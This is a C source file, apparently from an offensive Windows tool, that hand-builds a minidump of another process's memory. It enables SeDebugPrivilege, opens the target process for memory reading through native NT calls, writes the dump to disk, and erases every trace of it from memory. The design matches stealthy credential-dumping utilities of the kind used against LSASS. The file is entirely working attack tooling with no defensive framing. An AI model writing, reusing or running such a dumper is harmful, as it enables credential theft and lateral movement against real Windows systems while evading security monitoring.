// SPDX-License-Identifier: Apache-2.0

#include <windows.h>
#include <stdio.h>

#include "minidump.h"
#include "externs.h"
#include "utils.h"

BOOL FetchMiniDump(Pdump_context dc) {
	if (!write_header(dc))
		return FALSE;

	if (!write_directories(dc))
		return FALSE;

	if (!write_system_info_stream(dc))
		return FALSE;

	Pmodule_info module_list;
	module_list = write_module_list_stream(dc);
	if (!module_list)
		return FALSE;

	PMiniDumpMemoryDescriptor64 memory_ranges;
	memory_ranges = write_memory64_list_stream(dc, module_list);
	if (!memory_ranges)
	{
		free_linked_list(module_list); module_list = NULL;
		return FALSE;
	}

	free_linked_list(module_list); module_list = NULL;

	free_linked_list(memory_ranges); memory_ranges = NULL;

	return TRUE;
}

HANDLE GetProcessHandle(DWORD dwPid) {

	NTSTATUS status;
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes;

	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID uPid = { 0 };

	uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
	uPid.UniqueThread = (HANDLE)0;

	status = NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &ObjectAttributes, &uPid);
	if (hProcess == NULL) {
		return NULL;
	}

	return hProcess;
}

BOOL enable_debug_priv(void)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	NTSTATUS status = NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);

	if (status != STATUS_SUCCESS) {
		//Failed to open process token
		return FALSE;
	}

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	LPCWSTR lpwPriv = L"SeDebugPrivilege";
	if (!LookupPrivilegeValueW(NULL, lpwPriv, &tkp.Privileges[0].Luid)) {
		NtClose(hToken);
		return FALSE;
	}

	status = NtAdjustPrivilegesToken(hToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

	if (status != STATUS_SUCCESS) {
		//Failed to adjust process token
		return FALSE;
	}

	NtClose(hToken);
	return TRUE;
}

void free_linked_list(PVOID head) {
    if (!head)
        return;

    Plinked_list node = (Plinked_list)head;
    ULONG32 number_of_nodes = 0;
    while (node) {
        number_of_nodes++;
        node = node->next;
    }

    for (int i = number_of_nodes - 1; i >= 0; i--) {
        Plinked_list node = (Plinked_list)head;

        int jumps = i;
        while (jumps--)
            node = node->next;

        intFree(node); node = NULL;
    }
}

PVOID allocate_memory(PSIZE_T RegionSize) {
    PVOID BaseAddress = NULL;
    NTSTATUS status = NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &BaseAddress,
        0,
        RegionSize,
        MEM_COMMIT,
        PAGE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
#ifdef DEBUG
        printf(
            "Could not allocate enough memory to write the dump\n"
        );
#endif
        return NULL;
    }
    return BaseAddress;
}

void erase_dump_from_memory(Pdump_context dc) {

    // delete all trace of the dump from memory
    memset(dc->BaseAddress, 0, dc->rva);

    // free the memory area where the dump was
    PVOID BaseAddress = dc->BaseAddress;
    SIZE_T RegionSize = dc->DumpMaxSize;
    NTSTATUS status = NtFreeVirtualMemory(
        NtCurrentProcess(),
        &BaseAddress,
        &RegionSize,
        MEM_RELEASE
    );

    if (!NT_SUCCESS(status)) {
#ifdef DEBUG
        printf(
            "Failed to call NtFreeVirtualMemory, status: 0x%lx\n",
            status
        );
#endif
    }
}

BOOL write_file(char fileName[], char fileData[], ULONG32 fileLength) {
	HANDLE hFile;
	OBJECT_ATTRIBUTES objAttr;
	IO_STATUS_BLOCK IoStatusBlock;
	LARGE_INTEGER largeInteger;
	largeInteger.QuadPart = fileLength;
	wchar_t wcFilePath[MAX_PATH];
	wchar_t wcCwd[MAX_PATH];
	wchar_t wcFileName[MAX_PATH];
	PUNICODE_STRING pUnicodeFilePath = (PUNICODE_STRING)intAlloc(sizeof(UNICODE_STRING));

	NTSTATUS status;

	if (!pUnicodeFilePath) {
#ifdef DEBUG
		printf(
			"Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
			(ULONG32)sizeof(UNICODE_STRING),
			GetLastError()
		);
#endif
		return FALSE;
	}

	// Create the dump file the least difficult way possible
	hFile = CreateFileA(fileName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// Write the dump to disk
	status = NtWriteFile(
		hFile,
		NULL,
		NULL,
		NULL,
		&IoStatusBlock,
		fileData,
		fileLength,
		NULL,
		NULL
	);

	NtClose(hFile); hFile = NULL;

	if (!NT_SUCCESS(status)) {
#ifdef DEBUG
		printf(
			"Failed to call NtWriteFile, status: 0x%lx\n",
			status
		);
#endif
		return FALSE;
	}

	return TRUE;
}